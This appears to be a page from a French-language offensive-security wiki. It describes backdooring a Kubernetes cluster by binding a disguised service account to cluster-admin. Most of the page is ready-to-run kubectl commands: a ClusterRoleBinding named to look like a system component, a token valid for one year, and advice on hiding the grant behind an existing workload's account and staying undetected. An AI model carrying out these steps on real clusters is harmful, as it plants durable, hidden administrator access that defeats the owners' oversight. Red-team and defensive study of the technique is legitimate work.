---
order: 4
title: "Backdoor RBAC : une identité durable via les bindings"
description: "Un attaquant disposant de droits sur le RBAC crée un binding qui accorde à un service account ou un utilisateur qu'il contrôle un accès large et durable. Contrairement à un token volé, un ClusterRoleBinding persiste jusqu'à ce que quelqu'un le remarque et le supprime, survit à la rotation des identifiants, et peut être dissimulé parmi des bindings légitimes ou attaché à un service account d'apparence anodine."
keywords:
  - backdoor rbac
  - clusterrolebinding
  - service account
  - persistance
  - cluster-admin
---

# Backdoor RBAC

La persistance Kubernetes la plus durable est un octroi RBAC à une identité que l'attaquant contrôle. Un token peut être renouvelé et un pod supprimé, mais un ClusterRoleBinding qui accorde à un service account le rôle `cluster-admin` reste en vigueur jusqu'à ce qu'un opérateur le trouve et le supprime, et il continue de fonctionner quelle que soit la fréquence de réémission du token sous-jacent, car c'est le binding, et non le token, qui porte l'autorité. L'attaquant crée un service account (ou en réutilise un existant et anodin) et l'associe à un rôle puissant.

Nécessite les droits de création de bindings (ou les verbes `bind`/`escalate`) :

```bash
kubectl auth can-i create clusterrolebindings
```

## Poser le binding

```bash
# a service account that blends in, in a busy namespace
kubectl create serviceaccount monitoring -n kube-system 2>/dev/null
# bind it to cluster-admin
cat <<YAML | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: system:monitoring-metrics }   # a name that looks built-in
roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
subjects:
- { kind: ServiceAccount, name: monitoring, namespace: kube-system }
YAML
# mint a token for it whenever needed
kubectl create token monitoring -n kube-system --duration=8760h
```

## Rester caché

```bash
# name the binding and SA to resemble system components (system:*, *-metrics)
# prefer binding an EXISTING service account used by a real workload, so the
# subject looks legitimate and deleting it would break that workload
kubectl get clusterrolebindings | grep -iE 'admin|system'   # see what blends in
```

## Notes d'exploitation

- Le binding au rôle préexistant `cluster-admin` est la méthode la plus propre et ne requiert que la capacité de créer un ClusterRoleBinding (plus `bind` si l'anti-escalade s'applique) ; voir [Verbes escalate et bind](../rbac-privilege-escalation/escalate-and-bind-verbs.md).
- Nommer le binding et le service account pour imiter des composants système (`system:...`, `...-metrics`, `...-controller`) retarde la découverte, tout comme attacher l'octroi à un service account déjà utilisé par une vraie charge de travail.
- Une identité associée plus un `kubectl create token` à la demande offrent un accès renouvelable sans stocker de token où que ce soit ; un certificat client issu de l'[Approbation de CSR](../rbac-privilege-escalation/csr-approval.md) est une alternative qui survit même à la suppression du binding, jusqu'à la rotation de la CA.

## Références

- [Kubernetes: RBAC authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [Microsoft: Kubernetes threat matrix (persistence)](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
